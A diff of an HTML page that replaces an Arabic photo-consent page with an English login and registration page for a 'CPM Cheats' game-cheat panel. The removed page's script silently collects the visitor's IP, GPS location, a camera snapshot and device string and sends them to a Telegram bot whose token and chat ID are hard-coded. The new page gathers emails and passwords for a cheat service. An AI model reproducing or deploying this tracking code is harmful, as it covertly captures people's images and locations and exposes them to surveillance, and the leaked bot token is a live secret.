@@ -1,107 +1,160 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>موافقة</title>
-<style>
-body {
-  font-family: Arial;
-  text-align: center;
-  margin-top: 40px;
-}
-img {
-  width: 220px;
-  display: block;
-  margin: 20px auto;
-}
-button {
-  padding: 10px 20px;
-  font-size: 16px;
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CPM Cheats - Premium Control Panel</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&family=Roboto+Mono:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="assets/css/style.css">
 </head>
 <body>
+    <div id="particles-js"></div>
+    
+    <div class="app-container">
+        <header class="app-header">
+            <div class="header-content">
+                <div class="logo-container">
+                    <div class="logo-text">
+                        <h1>M31 CPM</h1>
+                        <div class="tagline">Premium Control Panel</div>
+                    </div>
+                </div>
+                <div class="header-actions">
+                                    </div>
+            </div>
+        </header>
 
-<h3>📸 سيتم التقاط صورة بعد موافقتك</h3>
-<p>وسيتم إرسالها مع الموقع ونوع الجهاز.</p>
+        <main class="app-main">
+            
+                            <div class="grid-system">
+                    <div class="card">
+                        <div class="card-header">
+                            <h3 class="section-title">
+                                <i class="fas fa-sign-in-alt"></i> Authentication
+                            </h3>
+                        </div>
+                        <div class="card-body">
+                            <form method="POST" id="loginForm" class="auth-form">
+                                <input type="hidden" name="action" value="authenticate">
+                                <div class="form-group">
+                                    <label class="form-label">Email Address</label>
+                                    <div class="input-group">
+                                        <i class="fas fa-envelope input-icon"></i>
+                                        <input type="email" name="email" class="form-input" required 
+                                               placeholder="your@email.com">
+                                    </div>
+                                </div>
+                                <div class="form-group">
+                                    <label class="form-label">Password</label>
+                                    <div class="input-group">
+                                        <i class="fas fa-lock input-icon"></i>
+                                        <input type="password" name="password" class="form-input" required 
+                                               placeholder="••••••••">
+                                    </div>
+                                </div>
+                                <button type="submit" class="btn btn-primary w-100" id="loginButton">
+                                    <i class="fas fa-sign-in-alt btn-icon"></i> 
+                                    <span class="btn-text">Sign In</span>
+                                </button>
+                            </form>
+                            <div class="mt-3 text-center">
+                                <button onclick="showModal('registrationModal')" class="btn btn-secondary w-100">
+                                    <i class="fas fa-user-plus btn-icon"></i>
+                                    <span class="btn-text">Create Account</span>
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
 
-<!-- 🔽 ضع رابط الصورة هنا -->
-<img src="https://ugc.production.linktr.ee/33eeaee9-a676-4312-b3bc-768c4266ef01_IMG-2923.webp?io=true&size=avatar-v3_0" alt="صورة">
+                    </main>
 
-<button onclick="start()">موافق</button>
+        <footer class="app-footer">
+            <div class="footer-content">
+                <div class="footer-brand">
+                    <div class="footer-logo">
+                        <div class="footer-logo-text">
+                            <h3> M31 CPM</h3>
+                            <div class="footer-tagline">Premium Gaming Solutions</div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="footer-nav">
+                    <h4>Quick Links</h4>
+                    <ul class="footer-links">
+                        <li><a href="#"><i class="fas fa-shield-alt"></i> Security</a></li>
+                        <li><a href="#"><i class="fas fa-question-circle"></i> Support</a></li>
+                        <li><a href="#"><i class="fas fa-file-alt"></i> Terms</a></li>
+                        <li><a href="#"><i class="fas fa-lock"></i> Privacy</a></li>
+                    </ul>
+                </div>
+                
+                <div class="footer-bottom">
+                    <div class="footer-stats">
+                        <div class="stat-badge">
+                            <i class="fas fa-bolt"></i>
+                            <span>Premium Features</span>
+                        </div>
+                        <div class="stat-badge">
+                            <i class="fas fa-shield"></i>
+                            <span>Secure Platform</span>
+                        </div>
+                        <div class="stat-badge">
+                            <i class="fas fa-users"></i>
+                            <span>Active Users</span>
+                        </div>
+                    </div>
+                    
+                    <div class="footer-social">
+                        <a href="https://t.me/M31_ROJI" aria-label="Telegram" target="_blank"><i class="fab fa-telegram"></i></a>
+                    </div>
+                    
+                    <div class="copyright">
+                        &copy; 2026 M31 CPM . All rights reserved. For educational purposes only.
+                    </div>
+                </div>
+            </div>
+        </footer>
+    </div>
 
-<canvas id="canvas" style="display:none;"></canvas>
+    <div id="processingOverlay" class="processing-overlay">
+        <div class="processing-content">
+            <div class="processing-spinner"></div>
+            <h3>Processing Request</h3>
+            <p>Please wait while we process your request...</p>
+        </div>
+    </div>
 
-<script>
-/* 🔧 عدّل هنا */
-const BOT_TOKEN = "7415148537:AAHC9RSt6Ka4Ip34qTCleHx0YXtfGaERwIA";
-const CHAT_ID  = "6251932709";
+    <div id="registrationModal" class="modal-overlay">
+    <div class="modal-content">
+        <div class="modal-header">
+            <h3 class="modal-title"><i class="fas fa-user-plus"></i> Create New Account</h3>
+        </div>
+        <form method="POST">
+            <input type="hidden" name="action" value="register_user">
+            <div class="form-group">
+                <label class="form-label">Email Address</label>
+                <input type="email" name="email" class="form-input" required placeholder="your@email.com">
+            </div>
+            <div class="form-group">
+                <label class="form-label">Password</label>
+                <input type="password" name="password" class="form-input" required placeholder="••••••••">
+            </div>
+            <div class="form-group">
+                <label class="form-label">Confirm Password</label>
+                <input type="password" name="confirm_password" class="form-input" required placeholder="••••••••">
+            </div>
+            <div class="modal-actions">
+                <button type="button" class="btn btn-secondary" onclick="hideModal('registrationModal')">Cancel</button>
+                <button type="submit" class="btn btn-primary">Create Account</button>
+            </div>
+        </form>
+    </div>
+</div>
 
-async function start() {
-  try {
-    // 🌐 IP
-    const ipRes = await fetch("https://api.ipify.org?format=json");
-    const ipData = await ipRes.json();
-    const ip = ipData.ip;
-
-    // 📍 الموقع
-    navigator.geolocation.getCurrentPosition(async pos => {
-      const lat = pos.coords.latitude;
-      const lon = pos.coords.longitude;
-
-      // 📸 الكاميرا (بدون معاينة)
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-      const video = document.createElement("video");
-      video.srcObject = stream;
-      await video.play();
-
-      const canvas = document.getElementById("canvas");
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext("2d").drawImage(video, 0, 0);
-
-      const imageBase64 = canvas.toDataURL("image/png");
-      stream.getTracks().forEach(t => t.stop());
-
-      // 📱 نوع الجهاز
-      const device = navigator.userAgent;
-
-      const text = `
-📸 صورة جديدة
-🌍 الموقع: ${lat}, ${lon}
-🌐 IP: ${ip}
-📱 الجهاز: ${device}
-      `;
-
-      // 📩 إرسال النص
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: text
-        })
-      });
-
-      // 📷 إرسال الصورة
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          photo: imageBase64
-        })
-      });
-
-      alert("✅ تم الإرسال");
-
-    }, () => alert("❌ تم رفض الموقع"));
-
-  } catch (e) {
-    alert("❌ حدث خطأ");
-  }
-}
-</script>
-
+    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+    <script src="assets/js/main.js"></script>
 </body>
 </html>
